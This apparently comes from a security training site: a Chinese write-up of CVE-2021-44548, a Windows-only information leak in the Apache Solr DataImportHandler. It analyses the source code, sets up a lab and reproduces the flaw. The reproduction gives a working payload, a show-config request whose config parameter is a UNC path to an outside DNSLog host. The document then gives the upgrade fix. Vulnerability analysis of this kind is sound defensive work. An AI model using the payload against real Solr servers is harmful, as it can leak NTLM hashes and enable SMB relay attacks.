## 前言

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。

如果文章中的漏洞出现敏感内容产生了部分影响，请及时联系作者，望谅解。

## 一、漏洞原理

### 漏洞简述

Apache Solr是一个开源的搜索服务，使用Java语言开发，主要基于HTTP和Apache Lucene实现的。

2021年12月18日，Apache发布安全公告，Apache
Solr中存在一个信息泄露漏洞（CVE-2021-44548），该漏洞影响了8.11.1之前的所有Apache
Solr版本（仅影响Windows平台）。Apache Solr的DataImportHandler中存在一个不正确的输入验证漏洞，可利用Windows
UNC路径从Solr主机调用网络上的另一台主机的SMB服务，或导致SMB攻击，从而造成：

  * 敏感数据泄露，如系统用户哈希（NTLM/LM哈希）；

  * 在系统配置错误的情况下，SMB中继攻击可能导致用户在SMB共享中被冒充，或导致远程代码执行。

### 漏洞分析

根据抓包内容中请求URL参数，以及solrconfig.xml中可以看到

![sorlconfig漏洞点.jpg](https://image.3001.net/images/20220519/1652930784_6285b8e014118cb3fe3e9.jpg!small)

漏洞点出于`DataImportHandler#handleRequestBody`

如果传入的`command=show-config`并且传入`config`不为空则有一个`openResource`操作，且参数可控

![](https://image.3001.net/images/20220519/1652930910_6285b95ececbf5aa99aa8.png!small)

看到`solr-core-8.11.0.jar!\org\apache\solr\core\SolrResourceLoader.openResource`

![openResource.png](https://image.3001.net/images/20220519/1652930785_6285b8e11b533ad66a9f9.png!small)

`this.getInstancePath()`得到的路径为`D:\Apache_Solr\solr-8.11.0\server\solr\core1`

再执行`resolve("conf")`变成，`D:\Apache_Solr\solr-8.11.0\server\solr\core1\conf`

再执行`resolve(resource)`时，这里的WindowsPathType变成了UNC

![resolve.png](https://image.3001.net/images/20220519/1652930785_6285b8e1e929938e393be.png!small)

resolve逻辑判断WindowsPathType是否为绝对路径或UNC路径，是则直接返回参数

![路径判断.png](https://image.3001.net/images/20220519/1652930786_6285b8e2990e416f98a76.png!small)

resource以`\\`开头就能使`inConfigDir`完全可控，在`Files.exists`中就会去请求windows的unc路径

## 二、漏洞复现实战

### 影响版本

Apache Solr < 8.11.1 （仅Windows）

### 环境搭建

Solr漏洞环境下载地址：

<https://archive.apache.org/dist/lucene/solr/8.11.0/solr-8.11.0.zip>

1）打开命令行，进入bin目录下，运行solr.cmd start

![运行Solr.jpg](https://image.3001.net/images/20220519/1652930787_6285b8e32f9684398574c.jpg!small)

2）再另一个命令行面板中执行solr.cmd create_core -c new_core

![Solr
创建core.jpg](https://image.3001.net/images/20220519/1652930787_6285b8e3c6668458b4907.jpg!small)

3）然后在solr-8.11.0\dist目录中添加三个jar包：

![Solr
dist添加jar包.jpg](https://image.3001.net/images/20220519/1652930788_6285b8e4692202fc86d38.jpg!small)

![Solr
dist添加情况.jpg](https://image.3001.net/images/20220519/1652930789_6285b8e52648f9387b319.jpg!small)

4）在solr-8.11.0\server\solr\core1\conf\solrconfig.xml中添加DataImportHandler路由

![配置solrconfig.xml.jpg](https://image.3001.net/images/20220519/1652930789_6285b8e5d6787ed0674de.jpg!small)

5）在C:\Users\Administrator\Downloads\solr-8.11.0\server\solr\core1\conf目录下新建data-config.xml文件，内容如下：

    
    
    <dataConfig>  
    <dataSource type="JdbcDataSource"  
    driver="com.mysql.jdbc.Driver"  
    convertType="true"  
    url="jdbc:mysql://IP:Port/test"  
    user="XXXX"  
    password="XXXX"/>  
    <document>  
    <entity name="entity" query="SELECT id, title, content, tags FROM test_table" >  
    </entity>  
    </document>  
    </dataConfig>

![配置data-config.xml.jpg](https://image.3001.net/images/20220519/1652930790_6285b8e67e264012c10c1.jpg!small)

6）重新启动solr

### 漏洞复现

进入Solr后台，选择core为我们新配置的core。

选择Dataimport，查看Configuration，可以看到我们新配置的data-config的详细信息

我们点击reload并抓包

![reload抓包.jpg](https://image.3001.net/images/20220519/1652930791_6285b8e70580539b0bf2e.jpg!small)

查看包内容，可以看到请求如下：

![request包详情.jpg](https://image.3001.net/images/20220519/1652930791_6285b8e7be48463489446.jpg!small)

URL参数添加参数，构造payload

payload：`[http://localhost:8983/solr/core1/dataimport?command=show-config&config=](http://localhost:8983/solr/core1/dataimport?command=show-config&config=)\\xxx\xxx`

我们添加&expandMacros=false&config=\hdlr07.dnslog.cn\aaa，发送请求：

![构造payload.jpg](https://image.3001.net/images/20220519/1652930792_6285b8e863620b18dd30b.jpg!small)

在DNSLog上可以看到收到请求

### 漏洞修复

目前此漏洞已经修复，建议受影响用户升级到Apache Solr 8.11.1。

下载链接：

<https://solr.apache.org/downloads.html>

缓解措施：

确保只有受信任的客户端才能向Solr的DataImporthandler发出请求

## 结束语

本文主要介绍了CVE-2021-44548 Apache Solr
敏感信息泄露漏洞的原理分析及复现过程，漏洞主要利用DataImportHandler存在输入验证缺陷，最终利用SMB服务导致敏感信息泄露。

 **更多网安技能的在线实操练习，[请点击这里>>](https://www.hetianlab.com/)**

